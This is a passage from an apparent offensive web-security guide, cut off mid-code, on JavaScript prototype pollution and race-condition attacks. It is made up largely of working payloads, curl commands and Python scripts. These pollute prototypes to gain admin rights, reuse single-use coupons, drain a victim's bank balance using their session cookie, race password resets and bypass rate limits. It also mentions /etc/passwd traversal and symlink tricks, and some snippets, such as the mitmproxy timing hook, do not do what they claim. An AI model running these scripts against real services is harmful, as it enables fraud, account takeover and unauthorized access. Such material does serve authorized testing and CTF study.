**POST body JSON pollution:** JSON payloads in request bodies are parsed into JavaScript objects and merged unsafely. Content-Type `application/json` allows sophisticated nested structures targeting prototype chains.

```
POST /api/config HTTP/1.1
Content-Type: application/json

{
  "settings": {
    "__proto__": {
      "isAdmin": true
    }
  }
}
```

An application merging this into a user object without sanitization:

```javascript
app.post('/api/config', (req, res) => {
  let userConfig = {};
  userConfig = deepMerge(userConfig, req.body.settings);
  
  // Now all objects inherit isAdmin: true from Object.prototype
  res.json({ status: 'Config updated' });
});
```

**URL-encoded form data pollution:** Traditional form submissions with `application/x-www-form-urlencoded` can also trigger pollution if parsed and merged unsafely.

```
POST /update HTTP/1.1
Content-Type: application/x-www-form-urlencoded

user[name]=attacker&__proto__[admin]=true
```

**Array index targeting:** Arrays are objects in JavaScript. Specifying array indices in query parameters can pollute array prototypes or exploit gaps in validation.

```
GET /process?items[0][__proto__][polluted]=true HTTP/1.1

# Or through constructor.prototype
GET /process?items[constructor][prototype][polluted]=true HTTP/1.1
```

**Nested depth exploitation:** Deeply nested parameters increase the likelihood of bypassing validation logic that only checks immediate properties.

```
GET /api?a[b][c][d][e][f][__proto__][polluted]=true HTTP/1.1
```

**Testing methodology:**

```bash
# Test basic __proto__ pollution
curl "http://target.com/api/endpoint?__proto__[polluted]=true"

# Test constructor.prototype path
curl "http://target.com/api/endpoint?constructor[prototype][polluted]=true"

# Test with POST JSON
curl -X POST http://target.com/api/endpoint \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"polluted":true}}'

# Test nested paths
curl "http://target.com/api/endpoint?settings[user][__proto__][admin]=true"

# Verify pollution affected other objects
curl "http://target.com/status" # Check if pollution persists across requests
```

## Gadget Exploitation

Gadgets are existing code patterns in JavaScript libraries that can be chained to achieve malicious outcomes when object properties are polluted. Rather than directly executing arbitrary code, gadgets use polluted properties as configuration triggers.

**Template injection gadgets:** Many template engines check boolean properties on objects to determine rendering behavior. Polluting these properties triggers unintended code execution paths.

```javascript
// Vulnerable template engine pattern
function renderTemplate(template, data) {
  if (data.escapeHtml !== false) { // If escapeHtml not explicitly false, escape
    // escape HTML
  }
  return render(template, data);
}

// After pollution with __proto__[escapeHtml]=false
// All rendered templates skip HTML escaping
// XSS payload in template becomes executable
```

Exploitation chain:

```bash
# 1. Pollute escapeHtml property
GET /render?__proto__[escapeHtml]=false HTTP/1.1

# 2. Submit template with XSS payload
GET /template?content=<img src=x onerror="alert(1)"> HTTP/1.1

# 3. Template renders without escaping due to polluted property
```

**Constructor property gadgets:** Some libraries check for constructor properties or use the `constructor.name` property for type validation. Polluting these bypasses checks.

```javascript
// Vulnerable validation
function validateInput(obj) {
  if (obj.constructor.name !== 'Object') {
    throw new Error('Invalid object type');
  }
  processObject(obj);
}

// After pollution: __proto__[constructor][name]='Object'
// Validation bypassed for malicious objects
```

**Express.js and framework gadgets:** Express middleware often reads properties from `req` or `res` objects. Polluting these affects behavior across the entire request chain.

```javascript
// Common gadget: authentication bypass via polluted isAuthenticated property
app.use((req, res, next) => {
  if (req.user && req.user.isAuthenticated) {
    req.isAdmin = true; // Set admin flag
  }
  next();
});

// After pollution: __proto__[isAuthenticated]=true
// All requests treated as authenticated
```

**Lodash and utility library gadgets:** Functions like `_.defaultsDeep()`, `_.merge()`, or `_.set()` can be exploited if they don't sanitize prototype keys.

```javascript
const _ = require('lodash');
const config = {};

// User-controlled payload
const payload = { __proto__: { polluted: true } };

// Vulnerable code
_.defaultsDeep(config, payload);

// After execution, Object.prototype.polluted === true
```

**Child process spawning gadgets:** If a polluted property controls command execution parameters, attackers can achieve RCE. Libraries that construct shell commands from object properties are vulnerable.

```javascript
// Vulnerable pattern
const spawn = require('child_process').spawn;

function executeCommand(options) {
  const args = options.args || [];
  const shell = options.shell || '/bin/sh';
  
  spawn(shell, args); // If args polluted, malicious commands execute
}

// After pollution: __proto__[args][0]='whoami'
// Malicious commands execute
```

**Global object pollution gadgets:** Polluting `Object.prototype.toString` or `Object.prototype.valueOf` affects type coercion throughout the application, potentially bypassing security checks.

```javascript
// After pollution: __proto__[toString]=function() { return 'admin'; }
// Type-dependent checks bypass
const user = {};
if (user.toString() === 'admin') {
  // Now true even though user isn't admin
  grantAccess();
}
```

**Gadget chain identification:**

```javascript
// Use this pattern to identify potential gadgets
// 1. Find property access on pollutable objects
grep -r "obj\[.*\]" application.js | grep -v sanitize

// 2. Look for conditional logic based on properties
grep -r "if.*property" application.js

// 3. Identify where polluted data flows
grep -r "req\.query\|req\.body" application.js

// 4. Trace to potential exploitation
grep -r "eval\|Function\|spawn\|exec" application.js
```

**ysoserial equivalents for Node.js:** While ysoserial targets Java deserialization, similar gadget chain identification can be performed for Node.js dependencies. [Unverified] Tools that automatically identify pollutable properties and trace execution paths to dangerous sinks are in development, though manual identification remains more reliable.

## JSON Pollution

JSON pollution specifically targets the JSON parsing and serialization behavior of applications. Attackers craft malicious JSON structures that, when merged or processed unsafely, pollute prototypes or execute gadget chains.

**JSON.parse() with unsanitized merge:** Applications that parse JSON and immediately merge it into existing objects without sanitizing keys are vulnerable.

```javascript
// Vulnerable endpoint
app.post('/api/update', (req, res) => {
  const data = JSON.parse(req.body);
  const config = defaultConfig;
  
  // Unsafe merge
  for (let key in data) {
    config[key] = data[key];
  }
  
  res.json(config);
});

// Malicious payload
POST /api/update HTTP/1.1
Content-Type: application/json

{
  "__proto__": {
    "adminOnly": false,
    "allowedActions": ["read", "write", "delete"]
  }
}
```

**Nested JSON object traversal:** Recursive merge functions iterate through all levels of JSON objects. Deep nesting increases pollution scope.

```javascript
// Malicious JSON
{
  "level1": {
    "level2": {
      "level3": {
        "__proto__": {
          "compromised": true
        }
      }
    }
  }
}

// Vulnerable recursive merge processes all levels
function recursiveMerge(target, source) {
  for (let key in source) {
    if (typeof source[key] === 'object') {
      target[key] = recursiveMerge(target[key] || {}, source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}
```

**Array-based pollution:** JSON arrays containing objects with prototype keys can pollute when merged.

```javascript
{
  "items": [
    { "__proto__": { "polluted": true } },
    { "name": "item2" }
  ]
}

// Vulnerable merge processing array items
items.forEach(item => {
  Object.assign(defaultItem, item);
});
```

**Constructor and prototype.constructor targeting:** JSON can target both `__proto__` and `constructor.prototype` paths.

```javascript
{
  "constructor": {
    "prototype": {
      "isAdmin": true,
      "canDelete": true
    }
  }
}
```

**Discriminator property abuse:** Some JSON deserialization libraries use discriminator properties to determine object type. Polluting these properties bypasses type validation.

```javascript
// Vulnerable pattern
const TypeMap = {
  'User': User,
  'Admin': Admin,
  'Guest': Guest
};

function deserialize(json) {
  const Type = TypeMap[json.type] || User;
  return new Type(json);
}

// Pollute with __proto__[type]='Admin'
// Objects deserialize as Admin regardless of actual type
```

**JSON reviver function exploitation:** The `JSON.parse(text, reviver)` function accepts a callback that processes each value. If the reviver unsafely assigns properties, pollution occurs.

```javascript
// Vulnerable reviver
const reviver = (key, value) => {
  if (key === '__proto__' || key === 'constructor') {
    return undefined; // Attempt to filter, but reviver receives already-parsed object
  }
  return value;
};

// This doesn't prevent pollution since the object structure already exists
const data = JSON.parse(payload, reviver);
```

Correct mitigation requires sanitizing keys before merge operations, not within the reviver.

**JSON with Unicode escapes:** Attackers can obfuscate pollution attempts using Unicode escapes in JSON strings. `\u005f\u005fproto\u005f\u005f` represents `__proto__`.

```javascript
// Obfuscated payload
{
  "\u005f\u005fproto\u005f\u005f": {
    "polluted": true
  }
}

// When JSON.parse processes this, the key becomes __proto__
```

**BigInt and special values in JSON:** While JSON spec doesn't support BigInt or undefined, some parsers have custom handling. [Speculation] Crafted JSON with non-standard values might bypass validation logic designed for standard JSON types.

**Testing methodology:**

```bash
# Test basic JSON pollution
curl -X POST http://target.com/api/config \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"polluted":true}}'

# Test constructor.prototype targeting
curl -X POST http://target.com/api/config \
  -H "Content-Type: application/json" \
  -d '{"constructor":{"prototype":{"polluted":true}}}'

# Test nested structures
curl -X POST http://target.com/api/config \
  -H "Content-Type: application/json" \
  -d '{"settings":{"nested":{"__proto__":{"polluted":true}}}}'

# Test array-based pollution
curl -X POST http://target.com/api/config \
  -H "Content-Type: application/json" \
  -d '{"items":[{"__proto__":{"polluted":true}}]}'

# Verify pollution affected other requests
curl http://target.com/api/status
```

## Server-Side Prototype Pollution

Server-side prototype pollution targets Node.js applications and affects behavior beyond the immediate request. Successful pollution can compromise the entire application's behavior until the process restarts or garbage collection clears the polluted properties.

**Request-level impact vs. application-level impact:** Client-side pollution affects the attacker's own environment. Server-side pollution affects all users and requests. A single malicious request can poison the entire application state.

```javascript
// Server-side vulnerability
const express = require('express');
const app = express();

app.post('/update', express.json(), (req, res) => {
  let config = require('./config'); // Load shared config
  config = merge(config, req.body); // Unsafe merge
  
  // Now all subsequent requests see polluted config
  res.json({ status: 'updated' });
});

// Single attacker request:
// POST /update with __proto__[apiKey]='attacker-key'
// All users' subsequent requests use attacker's API key
```

**Authentication bypass chains:** Server-side pollution commonly bypasses authentication by polluting user verification properties.

```javascript
// Vulnerable authentication middleware
app.use((req, res, next) => {
  const user = authenticateUser(req);
  
  if (user && user.role === 'admin') {
    req.isAdmin = true;
  }
  
  next();
});

// Attack: Pollute with __proto__[role]='admin'
// After pollution, authenticateUser returns user with polluted role
// All subsequent requests have req.isAdmin === true
```

**Database query pollution:** Polluting database query objects or ORM configurations can alter query behavior across the application.

```javascript
// Vulnerable ORM usage
const User = require('./models/User');

app.post('/api/users', (req, res) => {
  const query = {};
  merge(query, req.body.filter); // Unsafe merge of filter parameters
  
  User.find(query).then(users => {
    res.json(users);
  });
});

// Attacker pollutes: __proto__[lean]=true or other ORM options
// All subsequent User.find() calls inherit polluted options
```

**Environment variable and configuration pollution:** If configuration objects are stored as module-level variables, pollution affects the entire application lifetime.

```javascript
// Global configuration
const config = {
  port: 3000,
  debug: false
};

// Vulnerable endpoint merges user input into global config
app.post('/config', (req, res) => {
  merge(config, req.body);
  res.json({ status: 'updated' });
});

// Pollute with __proto__[debug]=true
// All logging and behavior controlled by debug flag now affected
```

**File system operation pollution:** Polluting properties that control file operations (permissions, paths, encoding) can lead to unauthorized file access or modification.

```javascript
// Vulnerable file operation
app.post('/download', (req, res) => {
  const options = {};
  merge(options, req.query);
  
  // If options.path polluted to '../../../etc/passwd'
  fs.readFile(options.path, (err, data) => {
    res.send(data);
  });
});
```

**Module initialization and singleton pollution:** Many Node.js applications use singleton patterns for database connections, loggers, and other shared resources. Polluting these affects all code using the singleton.

```javascript
// Logger singleton
const logger = {
  level: 'info'
};

// Vulnerable merge in initialization
merge(logger, userConfig);

// After pollution with __proto__[level]='debug'
// All logger calls use debug level
logger.log('sensitive data'); // Logs everything, exposing data
```

**Denial of Service through property pollution:** Polluting properties with computationally expensive values or infinite structures can cause DoS.

```javascript
// Attacker pollutes with __proto__[toJSON]=infiniteObject
// Subsequent JSON.stringify() operations hang indefinitely
JSON.stringify(anyObject); // Infinite recursion
```

**Garbage collection avoidance:** Polluted properties on `Object.prototype` persist until the property is deleted or the process restarts. [Unverified] In long-running applications, pollution can persist across millions of requests.

**Mitigation verification:**

```javascript
// Test if pollution persists across requests
// Request 1: Inject pollution
fetch('/api/endpoint?__proto__[polluted]=true');

// Request 2: Check if pollution affects new object
fetch('/api/check').then(r => r.json())
  .then(data => {
    console.log({}.polluted); // If true, server-side pollution confirmed
  });

// Test scope of pollution
// If multiple endpoints affected by single injection, application-wide pollution confirmed
```

**Dangerous property targets in server-side contexts:**

- `NODE_ENV`: Controls debug information exposure and behavior
- `env`: Environment variable objects
- `config`: Application configuration
- `isAdmin`, `isAuthenticated`: Security properties
- `role`, `permissions`: Authorization properties
- `exec`, `spawn`: Command execution properties (in contexts using these)
- `command`, `args`: Command parameters
- Database connection properties

**Exploitation workflow:**

```bash
# 1. Identify vulnerable merge points
curl http://target.com/api/status # Baseline response

# 2. Inject pollution
curl -X POST http://target.com/api/config \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"admin":true}}'

# 3. Verify pollution in application behavior
curl http://target.com/api/status # Response should show pollution effects

# 4. Exploit gadgets based on polluted properties
curl http://target.com/admin/dashboard # Should now grant access if admin=true was checked

# 5. Verify persistence
curl http://target.com/api/status # Pollution should persist across requests
```

**Proof-of-concept construction:** Document the exact merge function being exploited, the specific payload used, and the before/after behavior demonstrating pollution. Include network captures showing request/response sequences that prove the pollution affected server state. Create a timeline demonstrating pollution persistence across multiple requests.

---

# Race Conditions

## Core Concepts

Race conditions occur when application behavior depends on the sequence or timing of uncontrollable events. In web applications, this creates exploitable timing windows where attackers can manipulate state between validation and execution.

**Fundamental vulnerability pattern:**

1. Application checks a condition (authorization, balance, quantity)
2. Time window exists before action execution
3. Attacker modifies state during this window
4. Application executes action with stale validation result

## Timing Windows

### Identifying Timing Windows

**Manual detection indicators:**

- Multi-step processes (check → act)
- Asynchronous operations
- Database transactions without proper locking
- File system operations
- Session/token validation separate from action execution
- Rate limiting implementations
- Resource allocation systems

**Common vulnerable patterns:**

```
# Payment Processing
1. Check account balance → [TIMING WINDOW] → Deduct funds
2. Verify item stock → [TIMING WINDOW] → Reserve item
3. Validate coupon → [TIMING WINDOW] → Apply discount

# Access Control
1. Check user permissions → [TIMING WINDOW] → Execute privileged action
2. Verify session validity → [TIMING WINDOW] → Process request
```

### Exploitation Techniques

**Burp Suite Repeater Method:**

```
1. Capture target request in Burp Proxy
2. Send to Repeater (Ctrl+R)
3. Open multiple Repeater tabs (right-click → "Duplicate tab")
4. Send requests simultaneously:
   - Select all tabs (Shift+Click)
   - Right-click → "Send group in parallel"
   
Alternative: Use Turbo Intruder extension for precise timing
```

**Command Line with GNU Parallel:**

```bash
# Install parallel
apt install parallel

# Basic parallel execution
parallel -j 10 curl -X POST https://target.com/api/transfer \
  -H "Cookie: session=TOKEN" \
  -d "amount=1000&to=attacker" ::: {1..10}

# With precise timing
parallel --no-notice -j 20 --delay 0 \
  'curl -X POST "https://target.com/checkout" \
  -H "Cookie: SESSIONID" \
  -d "item_id=premium&quantity=1"' ::: {1..20}
```

**Python for Concurrent Requests:**

```python
import requests
import threading

def exploit_request():
    session = requests.Session()
    session.cookies.set('SESSIONID', 'your_session_token')
    
    response = session.post(
        'https://target.com/api/purchase',
        json={'item_id': 1337, 'quantity': 1}
    )
    print(f"Status: {response.status_code}, Response: {response.text}")

# Launch concurrent threads
threads = []
for i in range(20):
    t = threading.Thread(target=exploit_request)
    threads.append(t)
    t.start()

# Wait for completion
for t in threads:
    t.join()
```

**Using `asyncio` for Higher Concurrency:**

```python
import asyncio
import aiohttp

async def send_request(session, url, data):
    async with session.post(url, json=data) as response:
        return await response.text()

async def race_condition_exploit():
    url = "https://target.com/api/redeem"
    data = {"coupon_code": "SINGLE_USE_CODE"}
    
    async with aiohttp.ClientSession(
        cookies={'session': 'TOKEN'}
    ) as session:
        tasks = [send_request(session, url, data) for _ in range(50)]
        results = await asyncio.gather(*tasks)
        
        # Analyze results
        success_count = sum(1 for r in results if "success" in r.lower())
        print(f"Successful redemptions: {success_count}/50")

asyncio.run(race_condition_exploit())
```

### Timing Window Exploitation Strategies

**Single-Packet Attack (Connection Warming):**

```python
import socket

def single_packet_race(host, port, requests_data):
    # Pre-establish connections
    sockets = []
    for _ in range(10):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        sockets.append(s)
    
    # Send requests simultaneously via established connections
    for i, s in enumerate(sockets):
        s.sendall(requests_data[i].encode())
    
    # Retrieve responses
    for s in sockets:
        response = s.recv(4096)
        print(response.decode())
        s.close()
```

**Turbo Intruder Script (Burp Extension):**

```python
# Save as turbo_race.py in Burp Turbo Intruder
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=10,
                          requestsPerConnection=1,
                          pipeline=False)
    
    # Queue identical requests
    for i in range(20):
        engine.queue(target.req)
    
    # Send with minimal delay
    engine.start()

def handleResponse(req, interesting):
    table.add(req)
```

## TOCTOU (Time-of-Check-Time-of-Use)

### Classic TOCTOU Patterns

**File System TOCTOU:**

```
Vulnerable Code Pattern:
1. if (file_exists($upload_path . $filename))  // TIME-OF-CHECK
2.     return "File exists";
3. move_uploaded_file($tmp, $upload_path . $filename);  // TIME-OF-USE

Exploitation:
- Race between check and move operations
- Create symlink during window: ln -s /etc/passwd $filename
```

**Database TOCTOU:**

```sql
-- Vulnerable pattern
SELECT balance FROM accounts WHERE user_id = 123;  -- Check (returns 100)
-- [TIMING WINDOW]
UPDATE accounts SET balance = balance - 100 WHERE user_id = 123;  -- Use

Exploitation technique:
Send multiple withdrawal requests before any UPDATE commits
```

**Session/Token TOCTOU:**

```
1. Validate token exists in database  // Check
2. [TIMING WINDOW]
3. Execute privileged action using token  // Use

Attack: Logout/invalidate token during window while multiple requests are in-flight
```

### TOCTOU Exploitation Framework

**Methodology:**

```
1. IDENTIFY: Map check and use operations
   - Code review indicators: separate validation functions
   - Black-box: measure response time variance
   
2. MEASURE: Quantify timing window
   - Baseline: single request latency
   - Race: parallel request timing
   - Calculate exploitable window (typically 10-500ms)
   
3. EXPLOIT: Maximize success probability
   - Connection pooling: reduce network latency
   - Request volume: increase collision probability
   - Timing precision: synchronize requests
```

**Measuring Timing Windows:**

```python
import time
import requests

def measure_timing_window(url, check_endpoint, use_endpoint):
    session = requests.Session()
    
    timings = []
    for _ in range(100):
        start = time.perf_counter()
        
        # Trigger check operation
        session.get(check_endpoint)
        check_time = time.perf_counter()
        
        # Trigger use operation
        session.post(use_endpoint)
        use_time = time.perf_counter()
        
        window = use_time - check_time
        timings.append(window)
    
    avg_window = sum(timings) / len(timings)
    print(f"Average TOCTOU window: {avg_window*1000:.2f}ms")
    print(f"Min: {min(timings)*1000:.2f}ms, Max: {max(timings)*1000:.2f}ms")
```

### Practical TOCTOU Scenarios

**Scenario 1: Coupon/Gift Card Redemption**

```python
# Exploit single-use coupon multiple times
import requests
from concurrent.futures import ThreadPoolExecutor

def redeem_coupon(session, code):
    r = session.post('https://target.com/api/redeem', 
                     json={'code': code})
    return r.json()

session = requests.Session()
session.cookies.set('auth', 'YOUR_TOKEN')

with ThreadPoolExecutor(max_workers=30) as executor:
    futures = [executor.submit(redeem_coupon, session, 'ONETIME2024') 
               for _ in range(30)]
    results = [f.result() for f in futures]

successful = [r for r in results if r.get('success')]
print(f"Redeemed {len(successful)} times from single-use code")
```

**Scenario 2: Rate Limiting Bypass**

```bash
# Exploit race in rate limit implementation
# Target: API allows 10 requests/minute per user

# Using xargs for parallel execution
seq 100 | xargs -P 50 -I {} curl -X POST \
  "https://target.com/api/expensive_operation" \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"action": "compute"}'
  
# Expected: 10 succeed (rate limit)
# Actual with race: 50+ succeed (rate limit checked before increment)
```

**Scenario 3: Account Balance Manipulation**

```python
# Exploit: Transfer more than account balance
import asyncio
import aiohttp

async def transfer_funds(session, amount):
    async with session.post(
        'https://bank.target.com/transfer',
        json={'to': 'attacker_account', 'amount': amount}
    ) as resp:
        return await resp.json()

async def exploit():
    # Account balance: $100
    # Attempt: 10 transfers of $50 each
    
    async with aiohttp.ClientSession(
        cookies={'session': 'VICTIM_SESSION'}
    ) as session:
        tasks = [transfer_funds(session, 50) for _ in range(10)]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        successful = [r for r in results if isinstance(r, dict) 
                     and r.get('success')]
        total = sum(r.get('amount', 0) for r in successful)
        print(f"Transferred ${total} from $100 balance")

asyncio.run(exploit())
```

## Concurrent Request Exploitation

### Multi-Stage Race Conditions

**OAuth/Authentication Flow Races:**

```
Vulnerable flow:
1. User requests password reset → token generated
2. Token validation endpoint checks if token used
3. [TIMING WINDOW]
4. Password reset endpoint consumes token

Exploitation:
# Terminal 1: Monitor token generation
curl https://target.com/forgot-password -d "email=victim@example.com"

# Extract token from email/response
TOKEN="abc123def456"

# Terminal 2-11: Race token consumption
parallel -j 10 curl -X POST \
  "https://target.com/reset-password" \
  -d "token=$TOKEN&new_password=attacker123" ::: {1..10}
```

**Shopping Cart Race Conditions:**

```python
# Scenario: Apply discount code + modify quantity simultaneously
import requests
import threading

session = requests.Session()
session.cookies.set('cart_id', 'CART_TOKEN')

def apply_discount():
    session.post('https://shop.com/api/cart/discount', 
                json={'code': 'SAVE50'})

def update_quantity():
    session.post('https://shop.com/api/cart/update',
                json={'item_id': 1, 'quantity': 100})

# Race both operations
t1 = threading.Thread(target=apply_discount)
t2 = threading.Thread(target=update_quantity)

t1.start()
t2.start()
t1.join()
t2.join()

# Result: 50% discount applied to 100 items instead of intended 1 item
```

### Advanced Concurrent Techniques

**HTTP/2 Single-Packet Attack:**

```python
# Requires h2 library: pip install h2 hyper
from hyper import HTTPConnection

def http2_race_attack(host, path, headers, body, count=20):
    conn = HTTPConnection(host, port=443)
    
    # Queue multiple requests in single TCP packet
    stream_ids = []
    for _ in range(count):
        stream_id = conn.request('POST', path, body=body, headers=headers)
        stream_ids.append(stream_id)
    
    # Retrieve responses
    responses = []
    for sid in stream_ids:
        resp = conn.get_response(sid)
        responses.append(resp.read())
    
    return responses

# Usage
results = http2_race_attack(
    'target.com',
    '/api/purchase',
    {'Cookie': 'session=TOKEN'},
    '{"item_id": 1337}',
    count=30
)
```

**WebSocket Race Conditions:**

```python
import websocket
import threading
import json

def exploit_websocket_race():
    ws_url = "wss://target.com/api/socket"
    
    def send_message(ws):
        message = json.dumps({
            "action": "claim_reward",
            "reward_id": "DAILY_BONUS"
        })
        ws.send(message)
        response = ws.recv()
        print(f"Response: {response}")
    
    # Open multiple WebSocket connections
    connections = []
    for _ in range(10):
        ws = websocket.WebSocket()
        ws.connect(ws_url, cookie="session=TOKEN")
        connections.append(ws)
    
    # Send simultaneously
    threads = []
    for ws in connections:
        t = threading.Thread(target=send_message, args=(ws,))
        threads.append(t)
        t.start()
    
    for t in threads:
        t.join()
    
    for ws in connections:
        ws.close()

exploit_websocket_race()
```

### Race Condition Detection Tools

**Automated Detection with Custom Scripts:**

```bash
#!/bin/bash
# race_detector.sh - Detect potential race conditions

URL="$1"
COOKIE="$2"
THREADS=20

echo "[*] Testing race condition on: $URL"

# Send concurrent requests and analyze responses
seq $THREADS | xargs -P $THREADS -I {} curl -s -w "%{http_code}," \
  -X POST "$URL" \
  -H "Cookie: $COOKIE" \
  -H "Content-Type: application/json" \
  -d '{"action":"test"}' | \
  awk -F',' '{for(i=1;i<=NF;i++) a[$i]++} 
  END {for(code in a) print "HTTP " code ": " a[code] " responses"}'

# Success indicators:
# - Multiple 200 responses when only 1 expected
# - Varying response codes suggesting state inconsistency
```

**Race Condition Fuzzing:**

```python
# Automated race condition discovery
import requests
import concurrent.futures

def fuzz_race_condition(base_url, endpoints, session_cookie):
    results = {}
    
    for endpoint in endpoints:
        url = base_url + endpoint
        
        def test_request():
            return requests.post(
                url,
                cookies={'session': session_cookie},
                timeout=5
            )
        
        # Execute concurrent requests
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            futures = [executor.submit(test_request) for _ in range(20)]
            responses = [f.result() for f in concurrent.futures.as_completed(futures)]
        
        # Analyze for race condition indicators
        status_codes = [r.status_code for r in responses]
        response_bodies = [r.text for r in responses]
        
        # Flag potential race condition
        if len(set(response_bodies)) > 1 or status_codes.count(200) > 1:
            results[endpoint] = {
                'likely_vulnerable': True,
                'status_codes': status_codes,
                'unique_responses': len(set(response_bodies))
            }
    
    return results

# Usage
endpoints = ['/api/transfer', '/api/purchase', '/api/redeem', '/api/claim']
results = fuzz_race_condition('https://target.com', endpoints, 'YOUR_SESSION')
```

## Defense Bypass Techniques

**Bypassing Token-Based Synchronization:**

```
If application uses tokens to prevent races:
1. Identify token generation mechanism
2. Test if tokens are truly unique per request
3. Attempt token reuse across parallel requests
4. Check if token validation happens atomically with action
```

**Database Lock Circumvention:**

```
# [Inference] Some implementations may use inadequate locking
# Test different transaction isolation levels

# Row-level locks: Attack different rows simultaneously
# Table-level locks: May not prevent all race conditions
# Optimistic locking: Race the version check
```

**Rate Limit Racing:**

```python
# Exploit: Race condition in rate limiter itself
# If rate limit check and increment aren't atomic

def bypass_rate_limit(url, auth_token, requests_count=100):
    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
        futures = [
            executor.submit(
                requests.get,
                url,
                headers={'Authorization': f'Bearer {auth_token}'}
            )
            for _ in range(requests_count)
        ]
        results = [f.result() for f in futures]
    
    successful = [r for r in results if r.status_code != 429]
    print(f"Bypassed rate limit: {len(successful)}/{requests_count} succeeded")
```

## CTF-Specific Race Condition Patterns

**Flag Retrieval Race Conditions:**

```
Common CTF scenarios:
1. Admin panel access through session race
2. File download limit bypass
3. Database query result race (UNION injection timing)
4. Privilege escalation through role assignment race
```

**Example CTF Exploit Pattern:**

```python
# Scenario: Admin approval race condition
# Normal flow: Submit request → Admin approves → Access granted
# Race: Submit + Auto-approve before admin manual rejection

import requests
import threading

target = "https://ctf.example.com"
session = requests.Session()

def submit_request():
    session.post(f"{target}/api/request_admin", 
                json={'reason': 'I need access'})

def approve_request():
    # Exploit: Approval endpoint doesn't verify requester != approver
    session.post(f"{target}/api/approve_admin",
                json={'request_id': 'LAST'})

t1 = threading.Thread(target=submit_request)
t2 = threading.Thread(target=approve_request)

t1.start()
t2.start()
t1.join()
t2.join()

# Retrieve flag from admin panel
flag = session.get(f"{target}/admin/flag").text
print(f"Flag: {flag}")
```

## Key Tools Summary

**Burp Suite:**

- Repeater: Manual timing control
- Turbo Intruder: Precise concurrent requests
- Intruder: Automated race testing (less precise)

**Command Line:**

- `parallel`: GNU Parallel for shell-based races
- `xargs -P`: POSIX parallel execution
- `curl` with `&`: Background process racing

**Python Libraries:**

- `threading`: Thread-based concurrency
- `asyncio`/`aiohttp`: Asynchronous requests
- `concurrent.futures`: Thread/process pools
- `requests`: HTTP client (with Session for connection pooling)

**Testing Indicators:**

- Inconsistent responses from identical requests
- State changes persisting beyond intended limits
- Error messages indicating concurrent modification
- Success rates exceeding expected constraints

---

**Important Subtopics for Further Study:**

- Database transaction isolation levels and their race condition implications
- Distributed system race conditions (microservices, load balancers)
- Filesystem race conditions beyond web context
- Symbolic link attacks (symlink racing)

---

## Account Enumeration via Race Conditions

### Mechanism

Traditional account enumeration uses response differences (timing, error messages, HTTP status codes). Race condition enumeration exploits parallel requests to bypass rate limiting or trigger inconsistent states.

### Bypass Techniques

**Rate limit circumvention**:

```bash
# Parallel request technique
seq 1 100 | xargs -P 100 -I {} curl -X POST \
  "https://target.com/api/check-username" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin{}"}'
```

**Common vulnerable patterns**:

- Username availability checks without proper locking
- Registration endpoints with weak TOCTOU protection
- Password reset flows that query user existence

### Detection Indicators

- Inconsistent responses when same request sent simultaneously
- Temporary account locks that clear unpredictably
- Different error messages in rapid succession for identical inputs

## Distributed Race Conditions

### Architecture

Distributed systems introduce network latency and state synchronization delays between components (load balancers, application servers, databases, cache layers).

**Exploit surface**: Timing windows expand in distributed architectures due to:

- Database replication lag
- Cache invalidation delays
- Session store synchronization
- Microservice communication latency

### Single-Packet Attack (SPA)

Technique to maximize timing precision by embedding multiple requests in one TCP packet.

**HTTP/1.1 pipelining** (deprecated but sometimes supported):

```python
import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("target.com", 80))

requests = b"GET /api/withdraw?amount=1000 HTTP/1.1\r\nHost: target.com\r\n\r\n" * 20
sock.sendall(requests)
```

**HTTP/2 multiplexing**:

```bash
# Using h2load for parallel streams
h2load -n 1000 -c 100 -m 100 https://target.com/transfer
```

### Connection Warming

Pre-establish connections to reduce latency variance.

```python
import requests
from requests.adapters import HTTPAdapter

session = requests.Session()
adapter = HTTPAdapter(pool_connections=100, pool_maxsize=100)
session.mount('https://', adapter)

# Warm connections
for _ in range(10):
    session.get('https://target.com/')
```

### Multi-Endpoint Race Conditions

Exploit timing between different endpoints sharing state:

```
Endpoint A: Check balance (read)
Endpoint B: Withdraw funds (write)
```

Attack: Send multiple requests to B while A's check is in-flight.

### Jitter Reduction Techniques

Minimize request timing variance:

**Local proxy for precise timing**:

```python
from mitmproxy import http
import threading
import time

def request(flow: http.HTTPFlow):
    # Hold all requests
    time.sleep(0.1)
    
def response(flow: http.HTTPFlow):
    # Release simultaneously
    pass
```

**Server-side timing** (when controllable): Schedule requests to arrive simultaneously at server clock cycle.

## Burp Turbo Intruder Usage

### Installation

Extensions → BApp Store → Turbo Intruder

[Unverified]: Verify current installation method as Burp Suite extension marketplace structure may have changed.

### Core Features

**Gate mechanism**: Synchronizes request release for precise timing.

**Queue management**: Controls request scheduling and ordering.

### Basic Race Condition Template

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          requestsPerConnection=100,
                          pipeline=False)
    
    # Warm up connection
    engine.queue(target.req, gate='race1')
    
    # Queue attack requests
    for i in range(20):
        engine.queue(target.req, gate='race1')
    
    # Open gate - releases all at once
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

### Advanced Configuration Parameters

**concurrentConnections**: TCP connections to use

- Single connection: Better timing precision
- Multiple connections: Higher throughput

**requestsPerConnection**: Requests per TCP connection

- Higher values utilize HTTP pipelining/multiplexing
- Balance against server connection limits

**pipeline**: Enable HTTP/1.1 pipelining

```python
engine = RequestEngine(endpoint=target.endpoint,
                      concurrentConnections=5,
                      requestsPerConnection=50,
                      pipeline=True)
```

### Connection Warming Pattern

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=10,
                          requestsPerConnection=1,
                          pipeline=False)
    
    # Establish connections
    for i in range(10):
